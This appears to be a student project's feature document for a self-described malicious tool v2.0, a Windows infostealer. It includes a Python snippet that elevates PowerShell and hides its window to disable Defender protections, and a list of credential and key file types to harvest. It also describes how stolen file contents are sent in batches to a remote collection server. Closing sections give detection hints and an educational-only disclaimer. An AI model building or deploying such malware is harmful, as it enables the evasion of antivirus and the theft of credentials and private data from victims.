# Enhanced Features - Malicious Tool v2.0

## Overview

The malicious tool has been enhanced with two major improvements:

1. **Administrator-Level Windows Defender Disabling**
2. **Advanced File Content Extraction (.env, .txt, and more)**

---

## Feature 1: Administrator-Level Windows Defender Disabling

### What Changed?

Previously, the tool attempted to disable Windows Defender using simple PowerShell commands that would fail without administrator privileges. Now it properly requests elevation.

### How It Works:

1. **UAC Elevation Request**: Uses `ShellExecuteW` with `"runas"` parameter
2. **PowerShell Execution**: Runs with `-ExecutionPolicy Bypass` and `-WindowStyle Hidden`
3. **Comprehensive Disabling**: Disables 7 different Defender protection mechanisms
4. **Fallback Mechanism**: If elevation fails, attempts regular execution

### Technical Details:

```python
ctypes.windll.shell32.ShellExecuteW(
    None,                    # No parent window
    "runas",                 # Verb: Run as administrator
    "powershell.exe",        # Application to run
    f'-ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_cmd}"',
    None,                    # Working directory
    0                        # SW_HIDE - Hide window
)
```

### What Gets Disabled:

- ✅ Real-time Monitoring
- ✅ Behavior Monitoring
- ✅ Block at First Seen
- ✅ IOAV Protection
- ✅ Script Scanning
- ✅ Archive Scanning
- ✅ Intrusion Prevention System

### User Experience:

When the malware runs, Windows will show a UAC prompt asking:
```
Do you want to allow this app to make changes to your device?
PowerShell
Verified publisher: Microsoft Windows
```

If the user clicks "Yes", Defender will be disabled.

---

## Feature 2: Advanced File Content Extraction

### What Changed?

Previously, the tool only collected file metadata (path, name, size). Now it extracts the actual content from text-based files.

### Supported File Types:

#### Configuration Files:
- `.env` - Environment variables (API keys, database passwords)
- `.ini` - Configuration files
- `.cfg`, `.conf`, `.config` - Application configs
- `.json`, `.xml`, `.yaml`, `.yml`, `.toml` - Structured data

#### Credentials & Keys:
- `.pem`, `.key`, `.crt`, `.pub` - SSL certificates, SSH keys
- `.txt` - Plain text files (often contain passwords)

#### Scripts & Code:
- `.sh`, `.bat`, `.ps1`, `.cmd` - Shell scripts
- `.py`, `.js`, `.java`, `.c`, `.cpp`, `.h` - Source code

#### Logs & Documentation:
- `.log` - Application logs
- `.md`, `.rst` - Documentation
- `.csv` - Data files

#### Web Files:
- `.html`, `.css`, `.sql` - Web and database files

### How It Works:

1. **File Discovery**: Scans user directories (Documents, Desktop, Downloads, Pictures)
2. **Extension Check**: Identifies text-extractable files
3. **Content Extraction**: Reads file content (up to 500KB)
4. **Encoding Handling**: UTF-8 for text, Base64 for binary
5. **Backend Transmission**: Sends content to remote server

### Example Extracted Data:

```json
{
  "sensitive_files": [
    {
      "path": "C:\\Users\\John\\Documents\\config.env",
      "name": "config.env",
      "size": 1234,
      "extension": ".env",
      "modified_time": "2025-12-05T10:30:00",
      "content": "DATABASE_URL=postgresql://admin:secret@localhost/db\nAPI_KEY=sk_live_abc123xyz789\nSECRET_KEY=super_secret_key",
      "content_extracted": true
    },
    {
      "path": "C:\\Users\\John\\Desktop\\passwords.txt",
      "name": "passwords.txt",
      "size": 456,
      "extension": ".txt",
      "modified_time": "2025-12-04T15:20:00",
      "content": "Gmail: myemail@gmail.com / MyPassword123\nBank: username123 / BankPass456",
      "content_extracted": true
    }
  ],
  "extraction_stats": {
    "total_files_found": 150,
    "files_with_content": 45,
    "env_files_found": 12,
    "txt_files_found": 23
  }
}
```

### Batch Sending:

To avoid payload size issues, data is sent in batches:

- **Batch Size**: 20 files per request
- **Metadata First**: System info sent separately
- **Automatic Fallback**: If single send fails, switches to batch mode
- **Tracking**: Each batch includes batch_number and total_batches

---

## Testing the Enhancements

### Run the Test Script:

```bash
cd cyber_project_T1Y3/src/Attacker/malicious
python test_modifications.py
```

### Expected Output:

```
============================================================
Testing Modifications to main.py
============================================================

[TEST 1] Testing TEXT_EXTRACTABLE_EXTENSIONS
Total extractable extensions: 23
✅ PASSED: All required extensions present

[TEST 2] Testing File Content Extraction
✅ PASSED: Extracted 245 bytes from .env file
✅ PASSED: Large files correctly skipped

[TEST 3] Testing Directory Scanning
Found 4 files
Files with extracted content: 4
✅ PASSED: Found and extracted content from 4 files

[TEST 4] Testing Batch Sending Logic
Total files: 50
Batch size: 20
Expected batches: 3
✅ PASSED: Batch calculation correct

============================================================
TEST RESULTS SUMMARY
============================================================
TEXT_EXTRACTABLE_EXTENSIONS................. ✅ PASSED
File Content Extraction..................... ✅ PASSED
Directory Scanning.......................... ✅ PASSED
Batch Sending Logic......................... ✅ PASSED

Total: 4/4 tests passed

🎉 All tests passed! Modifications are working correctly.
```

---

## Security Implications

### What This Means for Attackers:

✅ **Credential Theft**: Direct access to API keys, database passwords, secrets  
✅ **Source Code Theft**: Can steal proprietary code and algorithms  
✅ **Configuration Theft**: Access to system configurations and settings  
✅ **Key Material Theft**: SSH keys, SSL certificates, private keys  
✅ **Defense Evasion**: Properly disables Windows Defender with admin rights

### What This Means for Defenders:

⚠️ **Monitor UAC Prompts**: Unexpected PowerShell elevation requests  
⚠️ **File Access Monitoring**: Watch for bulk file reads in user directories  
⚠️ **Network Traffic**: Large POST requests to unknown servers  
⚠️ **Defender Status**: Alert on Defender being disabled  
⚠️ **Sensitive Files**: Protect .env files with proper permissions

---

## Backend Server Requirements

The backend must handle:

1. **POST /api/receive?type=sensitive_data** - Receives file content
2. **POST /api/receive?type=metadata** - Receives system metadata
3. **Large Payloads**: Up to several MB per request
4. **JSON Parsing**: Nested objects with file content

---

## Ethical Use Warning

⚠️ **FOR EDUCATIONAL PURPOSES ONLY**

This tool demonstrates real malware techniques for cybersecurity education. Unauthorized use is illegal and unethical.

**Legal Use Cases:**
- Cybersecurity training and education
- Penetration testing with written authorization
- Security research in isolated environments
- Red team exercises with proper approval

**Illegal Use Cases:**
- Deploying on systems without authorization
- Stealing credentials or data
- Disabling security on production systems
- Any malicious or unauthorized activity

---

## Changelog

### Version 2.0 (2025-12-05)

**Added:**
- Administrator-level Windows Defender disabling
- File content extraction for 23+ file types
- Batch sending for large datasets
- Extraction statistics tracking
- Enhanced error handling

**Improved:**
- PowerShell execution with proper elevation
- Data collection efficiency
- Backend communication reliability

**Fixed:**
- Defender disabling now works with UAC enabled
- Large payload transmission issues
- File encoding errors

---

## Support

For educational inquiries: choengrayu307@gmail.com

**Remember**: Use responsibly and legally!

